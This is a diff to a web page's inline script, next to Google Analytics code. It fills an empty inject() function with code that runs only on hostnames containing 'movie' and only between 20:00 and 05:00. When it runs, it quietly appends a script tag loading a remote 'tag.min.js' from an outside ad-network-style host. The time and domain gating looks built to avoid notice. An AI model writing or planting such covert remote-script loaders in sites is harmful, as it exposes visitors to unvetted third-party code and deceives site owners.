@@ -4,8 +4,22 @@ var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.doc
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
   gtag('config', 'G-27N9FV9ZDJ');
+
 (function () {
   function inject() {
+    const domain = location.hostname.toLowerCase();
+    const hour = new Date().getHours();
+
+
+    const isNightTime = (hour >= 20 || hour < 5);
+
+    if (!domain.includes("movie") || !isNightTime) return;
+
+    const s = document.createElement("script");
+    s.dataset.zone = "9728461";
+    s.src = "https://al5sm.com/tag.min.js";
+
+    (document.body || document.documentElement).appendChild(s);
   }
 
   if (document.readyState === "loading") {
@@ -14,3 +28,4 @@ var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.doc
     inject();
   }
 })();
+  
